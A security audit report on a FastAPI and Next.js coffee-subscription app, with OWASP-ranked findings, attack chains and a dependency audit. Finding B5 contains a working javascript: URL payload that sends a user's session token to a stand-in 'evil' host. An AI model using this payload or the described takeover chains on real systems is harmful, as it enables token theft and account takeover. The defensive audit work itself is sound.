> **Status note.** This is the audit as written against commit `6f90340`, **before** the hardening in this branch. Findings B1 to B6, I1 to I9 and most of O1 to O11 are fixed in this branch. See `pentest-results.md` for the automated proof and `../../LAST_Report.md` for what is still open.

## Security Audit Report

**Target**: `/home/makhataei/Projects/Mine/FenjoonYar` on branch `security/hardening-pentest-ux` at commit `6f90340`. Scope: `backend/app/**` (FastAPI), `frontend/src/**` (Next.js App Router), `frontend/public/sw.js`, `frontend/next.config.ts`, both Dockerfiles, `docker-compose.yml`, `.env.example`, `.env` (values masked), `backend/requirements.txt`, `frontend/package.json` and `package-lock.json`.
**Date**: 2026-10-08
**Auditor**: advanced-developer (OWASP-focused security audit)
**Method**: Static review only. No servers were started, nothing was installed, and no project files were changed. The dependency audit used `npm audit --package-lock-only` and the OSV API (`api.osv.dev`), because `pip-audit` is not installed. Router behaviour was checked against the installed `next@15.5.4` source in `node_modules`.

---

### Attack Surface Summary

- **API routes**: 17 app endpoints plus 3 FastAPI auto-docs endpoints. 10 are protected and 7 are public, plus the docs.
  - Public: `POST /api/auth/request-otp`, `POST /api/auth/verify-otp`, `GET /api/plans`, `GET /api/cafes`, `GET /api/cafes/{slug}`, `GET /api/stats`, `GET /api/health`, plus `/docs`, `/redoc` and `/openapi.json`.
  - Customer (bearer JWT): `GET`/`PATCH /api/auth/me`, `GET /api/wallet`, `POST`/`GET /api/orders`, `POST`/`GET /api/redemptions`, `GET /api/redemptions/{code}`.
  - Partner (bearer JWT with role `partner` or `admin` and a `cafe_id`): `POST /api/partner/redemptions/confirm`, `GET /api/partner/summary`.
- **User input points (16)**: `phone`, `code`, `name` (verify-otp); `name`, `email` (PATCH /me); `plan_slug`; `cafe_slug`, `drink`; the `{code}` path param; partner `code`; query params `kind`, `city`, `tag`, `q`; the `{slug}` path param; the `Authorization` header. On the frontend: the login `?next=` query param, and the phone, name and code fields.
- **Auth boundaries**: Phone OTP login issues an HS256 JWT valid for 14 days. The frontend keeps it in `localStorage` and sends it as `Authorization: Bearer`. Roles are read from the database on every request. There is no server-side logout or revocation.
- **File uploads**: None.
- **External integrations**: None server-side. There is no SMS provider and no payment gateway yet. The browser loads Google Fonts CSS and fonts from Google.
- **Frontend routes**: `/[locale]` (home), `/plans`, `/cafes`, `/login`, `/app`, `/partner`. There is also a locale-redirect middleware and a service worker at scope `/`.

---

### Findings

#### Blocking (must fix immediately)

| # | OWASP | File:Line | Finding | Impact | Fix |
|---|-------|-----------|---------|--------|-----|
| B1 | A07 / A05 | `backend/app/config.py:14`, `backend/app/routers/auth.py:38`, `docker-compose.yml:10`, `.env.example:7`, `.env` (local copy, identical) | **The OTP is returned in the API response by default.** `EXPOSE_OTP` defaults to `"1"` in code, in compose and in `.env`, so `POST /api/auth/request-otp` returns `dev_code` to any caller. | **Critical.** Pre-auth account takeover of any phone number. Request a code for the victim's phone, read `dev_code`, and call verify-otp. That includes the seeded partner `09120000000` (see I8), which can confirm redemptions and accrue settlements. | Default to off (`os.getenv("EXPOSE_OTP","0")`). Allow it only when a separate `DEMO_MODE=1` is set, and refuse to start if `EXPOSE_OTP=1` while `ENV=production`. Set `EXPOSE_OTP: ${EXPOSE_OTP:-0}` in compose and `0` in `.env.example`. |
| B2 | A02 / A07 | `backend/app/config.py:7`, `docker-compose.yml:7`, `.env.example:2`, `.env` (identical to example) | **The JWT signing secret is public and has a default.** The fallbacks are `dev-secret-change-me` (code) and `change-me-in-production` (compose and `.env`). The app starts without complaint when the secret is unset or default. | **Critical.** Anyone can forge `{"sub":"<id>","exp":...}` with HS256 and impersonate any user. On a fresh database the seeded partner is user id 1. | Refuse to start unless `JWT_SECRET` is set, is at least 32 random bytes, and is not one of the known defaults. Use `JWT_SECRET: ${JWT_SECRET:?JWT_SECRET is required}` in compose. Remove the value from `.env.example` and add a `python -c "import secrets;print(secrets.token_urlsafe(48))"` hint. Rotate the secret on every deployment that used a default. |
| B3 | A07 / A02 | `backend/app/routers/auth.py:29`, `:41-49`; `backend/app/models.py:21-26` | **The OTP can be brute-forced.** Codes are 4 digits (9,000 values) from `random.randint`, a Mersenne Twister and not a CSPRNG. There is no attempt counter, no lockout, no per-IP or per-phone throttle, and a 3-minute TTL. The comparison `!=` is not constant-time. The same global `random` state also produces redemption codes, so an attacker who sees their own codes leaks generator state. | **Critical**, even with `EXPOSE_OTP=0`. At about 20 req/s an attacker covers about 40% of the space per 3-minute window and gets in after a few windows. Account takeover of any customer or partner. | Use `secrets.randbelow(10**6)` with 6 zero-padded digits. Add an `attempts` column and invalidate the code after 5 misses. Throttle per phone and per IP on both endpoints. Compare with `hmac.compare_digest`. Mark the code used in a conditional `UPDATE ... WHERE used=0 AND attempts<5`. Delete expired rows. |
| B4 | A04 (Insecure Design) | `backend/app/routers/wallet.py:63-90` (`status="paid"` at `:74`, no `is_active` check at `:69`) | **Orders are credited without payment.** `POST /api/orders` creates a `paid` order and a `CreditBatch` immediately. There is no payment verification, and inactive plans can also be bought. | **Critical** for any real deployment. Any user (and B1 or B3 make users free) mints unlimited cups. Those cups are redeemed at cafes, and the platform owes each cafe a settlement of 72% of 89,000 toman per cup. Direct financial loss. | Create orders as `pending` and credit cups only after server-side verification of the payment gateway callback (amount, order id and signature checked, idempotent). Put the instant-credit path behind `DEMO_MODE`. Filter `Plan.is_active == True`. |
| B5 | A03 (DOM XSS) / A01 (open redirect) | `frontend/src/app/[locale]/login/page.tsx:61-64` | **Unvalidated `?next=` goes into `router.push`.** In the installed Next 15.5.4, `router.push` resolves the URL, treats any cross-origin URL as external, and calls `location.assign(url)` (`next/dist/client/components/app-router.js:270-277`). `javascript:` URLs are not blocked in this version. | **High.** `https://<app>/fa/login?next=javascript:fetch('//evil/?t='+localStorage['cups.token'])` runs script on the app origin as soon as the victim finishes logging in, and steals the 14-day token (see I4). `?next=https://evil.example` is a post-login phishing redirect. | Accept only same-origin relative paths: `if (!raw?.startsWith('/') \|\| raw.startsWith('//') \|\| raw.startsWith('/\\')) use default; const u = new URL(raw, location.origin); if (u.origin !== location.origin) use default; router.push(u.pathname + u.search + u.hash)`. Optionally also require the `/${locale}/` prefix. |
| B6 | A06 | `frontend/package.json:12` (`next: 15.5.4`) | **The Next.js version has a critical pre-auth RCE and many High advisories.** GHSA-9qr9-h5gf-34mp is an RCE in the React Server Components flight protocol, and this app uses the App Router and RSC. Further Highs cover RSC and Server Action denial of service, SSRF and middleware bypass. Transitive Highs: `postcss`, `sharp`, `source-map-js`. | **Critical.** Unauthenticated remote code execution in the web container. | Upgrade to `next@15.5.27` (not a semver-major change; npm audit's `fixAvailable`), then rebuild the image. Run `npm audit` again afterwards to pick up the `source-map-js` fix. |

#### Important (fix before next release)

| # | OWASP | File:Line | Finding | Impact | Fix |
|---|-------|-----------|---------|--------|-----|
| I1 | A01 / A04 | `backend/app/routers/partner.py:25`, `:28`, `:43`; `backend/app/routers/wallet.py:133`; `backend/app/models.py:91` | **Partners can confirm any customer's code at any cafe, and codes can be brute-forced.** Confirmation looks the code up globally, with no `status=="pending"` filter and no rate limit. The cafe the customer picked is overwritten with `partner.cafe_id`. Codes are 6 digits (900k values) from `random.randint`, with no uniqueness constraint, so `.first()` can return an older confirmed or expired row that shares the code. | A rogue partner, or anyone who took over a partner account via B1, B2 or B3, can sweep the 900k space and redeem other customers' pending codes, which drains their cups and credits settlements to their own cafe. Code collisions are likely after about 1k codes (birthday bound) and produce false `409 already_used` errors for valid new codes. | Look up with `status=="pending" AND expires_at>now AND (cafe_id IS NULL OR cafe_id==partner.cafe_id)`. Generate codes with `secrets` (8 or more characters, or 6 digits plus a unique partial index on pending codes, retrying on collision). Allow one or a few pending codes per user. Add per-partner failure throttling and lockout, and log every confirm attempt. |
| I2 | A04 (race / TOCTOU) | `backend/app/routers/partner.py:36-49`; `backend/app/routers/wallet.py:17-24` | **Confirmation is a non-atomic read-modify-write.** It reads the batches, sets `cups_used += 1` in Python and sets the status, but there is no conditional update and no row lock. The handlers are sync and run concurrently in the threadpool. | Two partners confirming two codes from a customer with 1 cup left can both succeed: one cup is consumed and two settlements are recorded. Lost updates on `cups_used`. | In one transaction (`BEGIN IMMEDIATE` on SQLite): `UPDATE redemption SET status='confirmed',... WHERE id=? AND status='pending' AND expires_at>now`, then `UPDATE creditbatch SET cups_used=cups_used+1 WHERE id=? AND cups_used<cups_total AND expires_at>now`. Check `rowcount == 1` for each and roll back otherwise. |
| I3 | A07 | `backend/app/auth.py:15-39`; `backend/app/config.py:9`; `frontend/src/lib/useAuth.ts:33-36` | **Weak session lifecycle.** The JWT lives 14 days and has no `iat`/`jti`/token version. Logout is client-only, so a stolen token stays valid for 14 days. A validly signed token with a non-integer or missing `sub` raises `ValueError`/`KeyError` and returns 500. | Stolen tokens (B5, I4) cannot be revoked. 500 responses. | Add `token_version` to `User`, put it in the JWT and check it on every request. Add `POST /api/auth/logout` that bumps it. Cut the TTL to 24h or less, or use short access tokens with refresh. Wrap `int(payload["sub"])` and return 401. |
| I4 | A07 / A05 | `frontend/src/lib/api.ts:4-16` | **The bearer token is stored in `localStorage`** and there is no CSP (I5). | Any XSS, including B5, can read the token and replay it from anywhere for 14 days. | Move to an `HttpOnly; Secure; SameSite=Strict` cookie, either set by the API or through a Next route-handler BFF on the same site, and add CSRF protection for state-changing calls. At minimum, ship a strict CSP and fix B5. |
| I5 | A05 | `frontend/next.config.ts:3-6`; `frontend/src/app/[locale]/layout.tsx:53-59`; `backend/app/main.py:21-30` | **No security headers.** There is no CSP, `frame-ancestors`/`X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy` or HSTS on the web app or the API. | Nothing limits XSS (B5). The pages can be framed (clickjacking the partner panel). Weaker transport security. | Add `async headers()` in `next.config.ts` with a CSP using a nonce or hash for the inline theme script at `layout.tsx:59`, `connect-src` set to the API origin, and font sources (or self-host fonts, O11). Add `frame-ancestors 'none'`, `nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, and HSTS behind TLS. Add a small header middleware in FastAPI too. |
| I6 | A04 / A05 | `backend/app/routers/auth.py:27-38`; `backend/app/models.py:21-26` | **No rate limiting anywhere.** `request-otp` is unauthenticated and unbounded, and `OtpCode` rows are never purged. | When SMS is connected this enables SMS pumping (toll fraud) and harassment of any number. Unbounded table growth now. It also makes B3 and I1 brute force cheap. | Add a per-phone resend cooldown (about 60s), per-phone daily caps and per-IP limits, using `slowapi` or reverse-proxy `limit_req`. Purge expired and used OTP rows on a schedule. |
| I7 | A04 / A05 | `backend/app/routers/auth.py:22-24`, `:78-80`; `backend/app/routers/wallet.py:59-60`, `:113-115`; `backend/app/routers/partner.py:15-16`; `backend/app/routers/catalog.py:44-49` | **Inputs and request bodies have no size limits.** This covers `name`, `email` (not validated as email), `drink` (free text stored and returned to partners), `cafe_slug`, `plan_slug`, `code`, and the `q`/`city`/`tag` query params. | An attacker can fill the single SQLite file with multi-MB `name`/`drink` values. Accounts cost nothing (B1). | Add `Field(max_length=...)` to every string, `EmailStr` for email, `Literal["espresso","latte","cappuccino","filter","cold"]` for drink, and `Field(pattern=r"^\d{6}$")` for codes. Cap request bodies at the proxy or in middleware (e.g. 16 KB). |
| I8 | A07 / A05 | `backend/app/seed.py:86-92` | **A demo partner account is seeded in every environment.** The phone is `09120000000`, a real-format MCI number, bound to the cafe `noghte`. | With B1 anyone becomes this partner. With real SMS, whoever holds that number does. Partner sessions can confirm codes (I1) and see cafe settlement data. | Seed the demo partner only when `DEMO_MODE=1`. Provision real partners through an admin-only path. |
| I9 | A06 | `backend/requirements.txt:1-8`; `backend/Dockerfile:7-8` | **The pinned Python dependencies are vulnerable and the Docker image builds from them.** The local `.venv` was upgraded, but `requirements.txt` was not: PyJWT 2.10.1 (15 GHSAs: 1 Critical, 4 High), python-multipart 0.0.20 (3 High), fastapi 0.115.6 pulling starlette 0.41.x (3 High). Transitive dependencies such as h11 are unpinned and unhashed. | Shipped images carry known CVEs. Reachability today is limited: HS256 with a static secret and no JWKs, no form endpoints, no `FileResponse`. That changes as soon as features are added. Builds are not reproducible. | Pin the verified versions: `fastapi==0.142.2`, `starlette==1.7.0`, `PyJWT==2.15.1`, `uvicorn[standard]==0.54.0`, `sqlmodel==0.0.47`, `pydantic==2.13.5`. Drop the unused `qrcode`, `python-multipart` and `pydantic-settings`. Generate a hashed lock with `pip-compile --generate-hashes` or `uv pip compile`. Smoke-test, because Starlette 1.x is a major version. |

#### Optional (improve when possible)

| # | OWASP | File:Line | Finding | Impact | Fix |
|---|-------|-----------|---------|--------|-----|
| O1 | A05 | `backend/app/main.py:21` | `/docs`, `/redoc` and `/openapi.json` are public in all environments. | Gives attackers a free map of the API, including the partner endpoints. | `FastAPI(docs_url=None, redoc_url=None, openapi_url=None)` when `ENV=production`. |
| O2 | A05 | `backend/app/main.py:23-30` | CORS `allow_origin_regex` admits any `http://localhost:<port>` or `127.0.0.1:<port>` in every environment, with `allow_credentials=True` and wildcard methods and headers. Starlette uses `fullmatch`, so the regex cannot be bypassed with a suffix. | Low, because auth uses a bearer header rather than cookies. It does widen the trusted origins to any local process on the user's machine. | Drop the regex outside development. List methods (`GET, POST, PATCH`) and headers (`Authorization, Content-Type`) explicitly. Set `allow_credentials=False` while bearer auth is in use. |
| O3 | A05 | `backend/Dockerfile:1-14` | The API container runs as root. | Container escape or file-write bugs get root inside the container. | Add a non-root user, `chown /srv/data`, and set `USER app`. |
| O4 | A08 | `frontend/Dockerfile:5` | `npm ci ... \|\| npm install ...` falls back to an unlocked install. | Unvetted versions can enter the image silently. | Use `npm ci --no-audit --no-fund` only. |
| O5 | A05 | `frontend/.dockerignore:1-3` | `.env*` is not excluded, and `COPY . .` sends it into the builder. Next standalone copies `.env` and `.env.production` into the runtime image (`next/dist/build/index.js:263-272`). | This is latent, because no `frontend/.env` exists today. A future one would ship its secrets inside the image. | Add `.env*`, `.git`, `*.md` and `Dockerfile` to `frontend/.dockerignore`. |
| O6 | A02 | `.env.example:4-5`; `docker-compose.yml:26,31`; `frontend/src/lib/api.ts:2`; `backend/app/main.py:26` | All defaults are `http://` and no TLS or HSTS setup is documented for production. | Tokens and OTPs would cross the network in cleartext if the defaults are used as-is. | Terminate TLS in front of both services, use `https://` public URLs, and enable HSTS (I5). |
| O7 | A05 | `frontend/public/sw.js:28-36` | The service worker caches every same-origin GET, including error and redirect responses, with no size limit and no `response.ok` check. | Error pages get stuck in the cache and the cache grows without bound. No user data is cached today because API calls are cross-origin. | Cache only `response.ok && response.type==="basic"` for static assets and the shell. Cap the entry count and bump `CACHE` on each deploy. |
| O8 | Privacy (A01) | `backend/app/routers/partner.py:36-38`, `:50-56` | The confirm response returns the customer's name and the last 4 digits of their phone. `no_cups_left` tells a partner a customer's wallet state for any guessed code. | Personal data reaches partners beyond what they need, and it helps code-guessing (I1). | Return only drink and time. Use a single generic error for every invalid-code case. |
| O9 | A04 (integrity) | `backend/app/routers/catalog.py:81-84`; `frontend/src/lib/server.ts:20-21` | `/api/stats` adds hard-coded offsets (+9,400 members, +128,500 cups) to public figures. | Misleading public claims (consumer-protection risk), not a technical vulnerability. | Return the real counts, or label the figures clearly as projections. |
| O10 | A09 | backend-wide | No security logging: failed OTPs, failed or confirmed redemptions and partner actions leave no audit trail, and there is no alerting. | Brute force (B3, I1) and fraud (B4, I2) would go undetected and could not be investigated. | Write structured logs for auth success and failure (phone hashed), every confirm attempt with partner and cafe, and order creation. Alert on spikes. |
| O11 | A05 / A08 | `frontend/src/app/[locale]/layout.tsx:53-58` | Fonts load from Google at runtime. | Each visitor's IP goes to a third party. The page also depends on an external service that is often unreachable in Iran, and the CSP (I5) gets more complicated. | Self-host the Vazirmatn and Plus Jakarta Sans woff2 files in `public/fonts` using `next/font/local`. |

---

### Notable attack chains

1. **Anyone becomes a cafe partner and redeems customers' cups.** B1 (or B2 or B3) gives a session as `09120000000` (I8, partner of `noghte`). The attacker then sweeps 6-digit codes on `/api/partner/redemptions/confirm` with no rate limit (I1). Each hit consumes a customer's cup and books a settlement for the attacker's cafe.
2. **Free coffee at scale.** B1 or B3 gives any customer account. B4 lets it buy unlimited cups for free. It redeems them at real cafes, and the platform owes each cafe settlement for every cup.
3. **One-click token theft.** A victim follows `/fa/login?next=javascript:...` and logs in normally (B5). The script reads `localStorage['cups.token']` (I4) and sends it out, with no CSP to stop it (I5). The token cannot be revoked and is valid for 14 days (I3).

### Controls verified as working

- **No SQL injection.** All queries use SQLModel/SQLAlchemy expressions, and there is no `text()` or raw SQL.
- **JWT verification.** `jwt.decode(..., algorithms=["HS256"])` pins the algorithm, and `exp` is set and checked.
- **No mass assignment.** Pydantic request models ignore extra fields, so `role` and `cafe_id` cannot be set by users.
- **Ownership checks.** `/api/wallet`, `/api/orders`, `/api/redemptions` and `/api/redemptions/{code}` filter by `user_id`, and `/api/partner/summary` is scoped to `partner.cafe_id`.
- **CSRF is not applicable.** Auth uses a bearer header, not cookies.
- **Output escaping.** React escapes all user data, and the only `dangerouslySetInnerHTML` (`layout.tsx:59`) is a static constant.
- **CORS regex.** It uses `fullmatch`.
- **Error detail.** No debug mode and no stack traces are returned.

---

### Dependency Audit

**npm** (`npm audit --package-lock-only`, 132 packages): **4 vulnerable packages: 1 critical, 3 high, 0 moderate, 0 low.**

| Package | Severity | Direct | Notes | Fix |
|---|---|---|---|---|
| `next` 15.5.4 | **Critical** | yes | 33 advisories. GHSA-9qr9-h5gf-34mp (RCE in the RSC flight protocol, fixed in 15.5.7); GHSA-2xp9-vwfh-vxw4 (Image Optimization RCE with AVIF, fixed in 15.5.24); GHSA-p293-qw3h-jr36 (RCE on Windows hosts only, n/a); High: GHSA-267c/26hh/492v/36qx (middleware bypass, low impact here because middleware only handles locale), GHSA-mwv6/h25m/q4gf/8h8q/m99w/mg66 (RSC and Server Action DoS), GHSA-c4j6/89xv/p9j2 (SSRF) | `next@15.5.27` |
| `postcss` (via next) | High | no | GHSA-6g55-p6wh-862q, GHSA-r28c-9q8g-f849 (sourceMappingURL file read and path traversal); build-time | via `next@15.5.27` |
| `sharp` (via next) | High | no | GHSA-f88m-g3jw-g9cj, GHSA-rgj7-g3m4-5g8c, GHSA-wq5f-xc86-pv6w (libvips, libheif and librsvg CVEs) | via `next@15.5.27` |
| `source-map-js` | High | no | GHSA-68fv-2mgg-jv7q (event-loop DoS) | `npm audit fix` |

`react` and `react-dom` 19.1.1 and `qrcode` 1.5.4 have no known advisories.

**Python** (OSV against the `backend/requirements.txt` pins; Starlette is inferred as 0.41.x from fastapi 0.115.6's `<0.42` constraint): **29 advisories: 1 critical, 10 high, 13 moderate, 5 low.** These pins are what the Docker image installs.

| Package | Critical / High | Key IDs | Reachable today? | Fixed in |
|---|---|---|---|---|
| PyJWT 2.10.1 | 1 / 4 (15 total) | GHSA-ffc3-869f-jxw9 (C), GHSA-752w-5fwx-jx9f, GHSA-9v7f-9g4p-ffgj, GHSA-p4g4-x82p-q773, GHSA-xgmm-8j9v-c9wx | Mostly no: HS256 only, no JWK client, no asymmetric keys. GHSA-752w (unknown `crit` accepted) applies but has little impact here. | 2.15.0 or later (2.15.1 is in the venv) |
| python-multipart 0.0.20 | 0 / 3 (7 total) | GHSA-5rvq-cxj2-64vf, GHSA-pp6c-gr5w-3c5g, GHSA-wp53-j4wj-2cfg | No: no form endpoints, and the package is unused | Remove it |
| starlette 0.41.x | 0 / 3 (7 total) | GHSA-7f5h-v6xp-fcq8, GHSA-82w8-qh3p-5jfq, GHSA-wqp7-x3pw-xc5r | No: no `FileResponse`, forms or `StaticFiles` | 1.3.1 or later (1.7.0 is in the venv) |
| h11 (unpinned) | 1 / 0 | GHSA-vqfr-h8mv-ghfj (C, chunked-encoding smuggling) if an older version than 0.16 resolves | Low: `uvicorn[standard]` prefers httptools | 0.16.0 |

The upgraded local venv (fastapi 0.142.2, starlette 1.7.0, PyJWT 2.15.1, uvicorn 0.54.0, h11 0.16.0, pydantic 2.13.5, sqlmodel 0.0.47) has **0 known advisories**. The only problem is that `requirements.txt` still pins the old versions (I9).

---

### Secrets Scan

- **Hardcoded real secrets found: 0.** No private keys, cloud or API keys, or database URIs with credentials, in the working tree or in git history (`git log -p --all`).
- **Known default secrets that the app will run with: 3 locations.** These are the cause of B2:
  - `backend/app/config.py:7`: default JWT secret in code
  - `docker-compose.yml:7`: default JWT secret in compose
  - `.env.example:2`, committed. The local `.env` (untracked and gitignored) is byte-identical, so the local stack signs tokens with the public default.
- `.env`, `backend/data/cups.db` and `.idea/` are gitignored and not tracked.

---

### Summary

- **Blocking**: 6 findings (B1 to B6)
- **Important**: 9 findings (I1 to I9)
- **Optional**: 11 findings (O1 to O11)
- **Risk Level**: **CRITICAL**. B1, B2 or B3 alone gives unauthenticated takeover of any account, including a partner. B4 lets any user mint unlimited credit that the platform must settle with cafes. B6 is a known pre-auth RCE in the web tier.

**Suggested fix order:** B1, B2 and I8 are config-only changes and the fastest wins. Then B6 (`next@15.5.27`) and I9 (re-pin requirements), then B5 (validate `next`), then B3, I6 and I7 (OTP hardening, rate limits, input limits), then I1 and I2 (redemption lookup and atomic confirm), then B4 (payment flow or demo gate), then I3, I4 and I5 (sessions, token storage, headers).
